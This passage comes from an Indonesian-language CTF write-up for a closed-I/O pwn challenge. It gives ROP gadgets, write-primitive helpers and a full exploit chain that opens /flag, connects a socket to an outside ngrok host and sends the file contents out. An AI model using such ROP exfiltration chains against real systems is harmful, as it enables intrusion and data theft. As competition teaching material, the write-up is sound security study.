</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>char</span> buf[...];
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>write</span>(<span style=color:#e0af68>1</span>, <span style=color:#9ece6a>&#34;no view(), no surrender!</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, ...);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>read</span>(<span style=color:#e0af68>0</span>, buf, ...);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>close</span>(<span style=color:#e0af68>2</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>close</span>(<span style=color:#e0af68>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>close</span>(<span style=color:#e0af68>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>closed I/O ini didapat ide dari soal ISITDTU Final, <code>babyarmv2</code>, beberapa hari lalu, kudos to orgs.</p><p>Intended solution dari soal ini dengan buka socket fd dan connect ke server dan menulis isi file <code>flag</code> pada fd tersebut. Sebelum itu semua yang diperlukan adalah arbitrary write primitive dengan <code>mov [dst], src</code> dan untungnya terdapat gadget seperti ini pada binary.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x08057bd2: mov dword ptr [edx], eax; ret;</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x080ab5ca: pop eax; ret;</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x0806ee8b: pop edx; ret;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>write_where_what</span>(where, what):
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>0x080ab5ca</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(what)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x0806ee8b</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(where)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x08057bd2</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> payload
</span></span></code></pre></div><p>arbitrary write primitive ini bisa digunakan dengan fungsi lain untuk memudahkan penulisan string panjang, <code>write_str</code>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>write_str</span>(where, data):
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;&#39;</span>
</span></span><span style=display:flex><span>    data_split <span style=color:#9ece6a;font-weight:700>=</span> [data[i:i<span style=color:#9ece6a;font-weight:700>+</span><span style=color:#e0af68>4</span>]<span style=color:#9ece6a;font-weight:700>.</span>ljust(<span style=color:#e0af68>4</span>, <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>) <span style=color:#bb9af7>for</span> i <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a>len</span>(data), <span style=color:#e0af68>4</span>)]
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> d <span style=color:#9ece6a;font-weight:700>in</span> data_split:
</span></span><span style=display:flex><span>        payload <span style=color:#9ece6a;font-weight:700>+=</span> write_where_what(where, u32(d))
</span></span><span style=display:flex><span>        where <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#e0af68>4</span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> payload
</span></span></code></pre></div><p><code>write_str</code> ini berguna untuk menyiapkan <em>argument</em> yang digunakan pada syscall, misalnya <code>open(3)</code>. btw, ada tambahan juga, fungsi untuk memudahkan memanggil syscall.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x0806eeb2: pop ecx; pop ebx; ret;</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x0806f7c0: int 0x80; ret;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>syscall</span>(eax, ebx<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>, ecx<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>, edx<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>0</span>):
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>0x0806ee8b</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(edx)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x080ab5ca</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(eax)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x0806eeb2</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(ecx)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(ebx)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x0806f7c0</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> payload
</span></span></code></pre></div><p><em>the exploit</em>, saya tidak akan terlalu membahas dalam <code>sokcetcall</code> syscall karena sudah <a href=https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/>ada</a> <a href=https://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html>banyak</a> <a href=#>yang</a> <a href=https://medium.com/@chaudharyaditya/slae-0x2-linux-x86-reverse-shellcode-d7126d638aff>membahas</a> tentang ini sebelumnya.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>(REMOTE):
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;AAAAAAAAAAAAAAAAAAAA&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># open flag</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> write_str(elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x10</span>), <span style=color:#9ece6a>&#39;/flag</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> syscall(<span style=color:#e0af68>5</span>, elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x10</span>), <span style=color:#e0af68>0</span>, <span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># open socket</span>
</span></span><span style=display:flex><span>    sock_arg  <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>2</span>)
</span></span><span style=display:flex><span>    sock_arg <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    sock_arg <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> write_str(elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x20</span>), sock_arg)
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> syscall(<span style=color:#e0af68>0x66</span>, <span style=color:#e0af68>1</span>, elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x20</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># connect</span>
</span></span><span style=display:flex><span>    IPHEX <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x030ed4ad</span> <span style=color:#414868;font-style:italic># 0.tcp.ngrok.io</span>
</span></span><span style=display:flex><span>    connect_struct  <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>0x0b290002</span>) <span style=color:#414868;font-style:italic># port: 1507, domain: AF_INET</span>
</span></span><span style=display:flex><span>    connect_struct <span style=color:#9ece6a;font-weight:700>+=</span> p32(IPHEX)[::<span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> write_str(elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x30</span>), connect_struct)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    connect_arg  <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>1</span>) <span style=color:#414868;font-style:italic># sockfd</span>
</span></span><span style=display:flex><span>    connect_arg <span style=color:#9ece6a;font-weight:700>+=</span> p32(elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x30</span>)) <span style=color:#414868;font-style:italic># connect_struct</span>
</span></span><span style=display:flex><span>    connect_arg <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x10</span>) <span style=color:#414868;font-style:italic># connect_struct size</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> write_str(elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x100</span>), connect_arg)
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># connect(sockfd, (struct sockaddr *) &amp;connect_struct, 0x10)</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> syscall(<span style=color:#e0af68>0x66</span>, <span style=color:#e0af68>3</span>, elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x100</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># read flag</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> syscall(<span style=color:#e0af68>3</span>, <span style=color:#e0af68>0</span>, elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x200</span>), <span style=color:#e0af68>0x100</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># write to sockfd</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> syscall(<span style=color:#e0af68>4</span>, <span style=color:#e0af68>1</span>, elf<span style=color:#9ece6a;font-weight:700>.</span>bss(<span style=color:#e0af68>0x200</span>), <span style=color:#e0af68>0x100</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, payload)
</span></span></code></pre></div><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>